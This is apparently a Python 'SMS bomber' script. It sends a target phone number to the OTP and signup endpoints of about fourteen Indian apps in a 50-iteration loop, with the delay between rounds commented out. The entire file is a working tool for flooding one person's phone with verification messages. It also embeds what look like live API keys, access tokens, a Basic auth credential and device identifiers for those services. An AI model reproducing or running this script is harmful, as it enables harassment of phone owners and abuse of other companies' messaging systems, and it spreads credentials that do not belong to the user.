import requests
import time

def smsge(number):
    number = str(number)
    
    # List of APIs to call
    apis = [
        {
            "method": "POST",
            "url": "https://www.namniart.in/services/user/signup",
            "headers": {
                "platform": "android",
                "version-name": "10.1.6.0",
                "version-code": "476",
                "os": "34",
                "Content-Type": "application/x-www-form-urlencoded"
            },
            "data": f"email=&phone={number}&wa_opt=true"
        },
      
        {
            "method": "POST",
            "url": "https://api.kiranafriends.com/v4/authenticate?language=En",
            "headers": {
                "Authorization": "bearer",
                "Content-Type": "application/json",
                "User-Agent": "okhttp/4.8.0"
            },
            "json": {
                "app_version": "8.0",
                "device_model": "samsung SM-F7110",
                "isFromTruecaller": False,
                "is_message_send": False,
                "language": "En",
                "mobile_no": number,
                "os_version": "14",
                "platform": "Android",
                "whatsapp_opted_in": True
            }
        },
        {
            "method": "GET",
            "url": f"https://internal.er15.xyz/api/RetailerApp/Genotp?MobileNumber={number}&deviceId=c7abc1fd7459e84c&Apphash=C3I7kUIxA3g&mode=release",
            "headers": {
                "username": f"{number}_0",
                "section": "Generate OTP",
                "user-agent": "okhttp/5.0.0-alpha.2"
            }
        },
        {
            "method": "POST",
            "url": "https://tootoo.in/graphql",
            "headers": {
                "accept": "*/*",
                "authorization": "",
                "source": "android",
                "app-version": "3.5",
                "Content-Type": "application/json",
                "User-Agent": "okhttp/4.9.2"
            },
            "json": {
                "operationName": "sendOtp",
                "variables": {"mobile_no": number, "resend": 0},
                "query": """
                    query sendOtp($mobile_no: String!, $resend: Int!) {
                        sendOtp(mobile_no: $mobile_no, resend: $resend) {
                            success
                            __typename
                        }
                    }
                """
            }
        },
        {
            "method": "POST",
            "url": "https://asia-south1-op-d2r.cloudfunctions.net/authenticated_send_otp",
            "headers": {
                "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36",
                "content-type": "application/json"
            },
            "json": {
                "data": {
                    "uid": "",
                    "selfUserId": "",
                    "env": "prod",
                    "appVersion": "6.1.1",
                    "phoneNumber": f"+91{number}",
                    "isResend": False,
                    "deviceId": "c7abc1fd7459e84c"
                }
            }
        },
        {
            "method": "GET",
            "url": f"https://2factor.in/API/V1/ea8b35b1-af9b-11ee-8cbb-0200cd936042/SMS/{number}/AUTOGEN",
            "headers": {
                "user-agent": "okhttp/4.9.0"
            }
        },
        {
            "method": "POST",
            "url": "https://db.ezobooks.in/kappa/api/login/sendOtp",
            "headers": {
                "content-type": "application/x-www-form-urlencoded",
                "user-agent": "okhttp/4.10.0"
            },
            "data": f"phone={number}"
        },
        {
            "method": "POST",
            "url": "https://okapis.io/auth/v1.0/otp:request",
            "headers": {
                "okc-login-flow-id": "542456b4-54e3-4748-a50d-792f6a511705",
                "x-request-id": "8d66c746-016c-48d6-82a8-337925e6bfd6",
                "date": "Sun, 04 Aug 2024 22:26:20 GMT+05:30",
                "user-agent": "tech.okcredit.android.base/1453",
                "x-deviceid": "26fb22d2-42ec-4635-9294-cf540176c149",
                "okc_app_version": "1453",
                "content-type": "application/json; charset=UTF-8"
            },
            "json": {
                "mobile": number,
                "mode": "PUSH",
                "otp_flow_type": "Login"
            }
        },
        {
            "method": "POST",
            "url": "https://www.beyoung.in/api/sendOtp.json",
            "headers": {
                "accept": "application/json, text/plain, */*",
                "cache-control": "no-cache",
                "pragma": "no-cache",
                "expires": "0",
                "device": "app",
                "platform": "android",
                "platform-version": "34",
                "app-version": "8.0.4",
                "access-token": "zUCRF0NUX+PmeRrqGIOGf/bZgYvqLip3mzP3Ob6Qnc0kKoAsPEi6UXHz+llcPD+fbZF0AiEuZpNXbC7CPp4iBg==",
                "content-type": "application/json",
                "user-agent": "okhttp/4.9.2"
            },
            "json": {
                "username": number,
                "username_type": "mobile",
                "service_type": 0,
                "vid": "1615332024275743"
            }
        },
        {
            "method": "POST",
            "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.0.6",
            "headers": {
                "x-app-id": "0c460f69-1df3-4826-9f65-7c92ef89aa93",
                "x-app-version": "3.0.6",
                "x-user-journey-id": "f9ba697f-e1b3-4850-b217-8e58d7c23f7d",
                "content-type": "application/json; charset=UTF-8",
                "user-agent": "okhttp/5.0.0-alpha.11"
            },
            "json": {
                "phone_number": {
                    "country_code": "+91",
                    "number": number
                }
            }
        },
        {
            "url": "https://order.retailio.in/api/ms/user-service/user/verifyUserAndSendOTPForLogin",
            "method": "POST",
            "headers": {
                "Host": "order.retailio.in",
                "content-length": "40",
                "x-instana-t": "311e3c32c6f62603",
                "sec-ch-ua": '''"Not/A)Brand";v="8", "Chromium";v="126", "Android WebView";v="126"''',
                "version": "2",
                "source": "retailer-android-app",
                "sec-ch-ua-mobile": "?1",
                "x-instana-l": "1,correlationType=web;correlationId=311e3c32c6f62603",
                "user-agent": "Mozilla/5.0 (Linux; Android 14; SM-F7110 Build/UP1A.231005.007;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/126.0.6478.186 Mobile Safari/537.36",
                "content-type": "application/json",
                "accept": "application/json",
                "x-instana-s": "311e3c32c6f62603",
                "sec-ch-ua-platform": "Android",
                "origin": "https://order.retailio.in",
                "x-requested-with": "com.retailio.retailerapp",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://order.retailio.in/rio/secure-login",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "en,en-US;q=0.9",
                "cookie": "_clck=1garnbg%7C2%7Cfo1%7C0%7C1677"
            },
            "json": {"type": "1", "mobileNumber": number}
        },
        {
            "url": "https://api.vegease.in/egreen/api/v1/user/loginWithOtp-new",
            "method": "POST",
            "headers": {
                "Host": "api.vegease.in",
                "content-length": "207",
                "sec-ch-ua": '''"Not/A)Brand";v="8", "Chromium";v="126", "Android WebView";v="126"''',
                "sec-ch-ua-mobile": "?1",
                "authorization": "Basic ZWdyZWVuOmVncmVlbkAxMjM=",
                "api_key": "123456",
                "content-type": "application/json",
                "accept": "application/json, text/plain, */*",
                "user-agent": "Mozilla/5.0 (Linux; Android 14; SM-F7110 Build/UP1A.231005.007;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/126.0.6478.186 Mobile Safari/537.36",
                "platform": "1",
                "timezone": "480",
                "sec-ch-ua-platform": "Android",
                "origin": "http://localhost",
                "x-requested-with": "com.vegease",
                "sec-fetch-site": "cross-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "http://localhost/",
                "accept-encoding": "gzip, deflate, br, zstd",
                "accept-language": "en,en-US;q=0.9",
                "priority": "u=1, i"
            },
            "json": {
                "deviceId": "c7abc1fd7459e84c",
                "mobileNo": number,
                "deviceToken": "d4xvbA_bxV0DxgiQu-ej7J:APA91bEUUyHvFAtFLdf5aa6wMCRRKqEX1OdxrjW_QM03s6IKjLmEC0h2F9da6CsYWO7i95VY2Blc",
                "countryCode": "91",
                "hybrid": True
            }
        },
        
        {
            "url": "https://api-consumer.bharatpe.in/login/otp/generate",
            "method": "POST",
            "headers": {
                "Host": "api-consumer.bharatpe.in",
                "platform": "0",
                "clientid": "12pclub",
                "token": "",
                "installid": "d9a111cf-c211-42eb-8e27-216f6d4987531722794079",
                "simid": "",
                "device": "c7abc1fd7459e84c",
                "appversion": "134",
                "lat": "27.8844362",
                "lon": "78.0796562",
                "content-type": "application/json; charset=UTF-8",
                "content-length": "47",
                "accept-encoding": "gzip",
                "user-agent": "okhttp/3.12.10"
            },
            "json": {"mobile": number, "hashKey": "D/WyK6jVuHn"}
        },
        
        {
            "url": "https://api-v2.oolka.in/v2/customer/phone",
            "method": "POST",
            "headers": {
                "accept": "application/json",
                "clientversion": "2.1.5",
                "osname": "android",
                "accept-encoding": "gzip",
                "deviceid": "[object Object]",
                "encrypteddeviceid": "[object Object]",
                "devicebrand": "samsung",
                "devicemodel": "SM-F7110",
                "x-request-id": "7c641425-d69e-7f0d-11fb-dbb2733b7734",
                "Content-Type": "application/json",
                "Content-Length": "60",
                "Host": "api-v2.oolka.in",
                "Connection": "Keep-Alive",
                "User-Agent": "okhttp/4.11.0"
            },
            "json": {"androidID": "c7abc1fd7459e84c", "phone_number": number}
        },
    ]

    # Run the requests for 50 iterations
    for _ in range(50):
        for api in apis:
            try:
                if api["method"] == "POST":
                    if "json" in api:
                        response = requests.post(api["url"], headers=api["headers"], json=api["json"])
                    else:
                        response = requests.post(api["url"], headers=api["headers"], data=api["data"])
                elif api["method"] == "GET":
                    response = requests.get(api["url"], headers=api["headers"])
                
                print(f"Request to {api['url']} - Status Code: {response.status_code}")
                print(response.text)
                
            except Exception as e:
                print(f"Error during request to {api['url']}: {e}")
        
        # Add a delay of 10 seconds between requests
     #   time.sleep
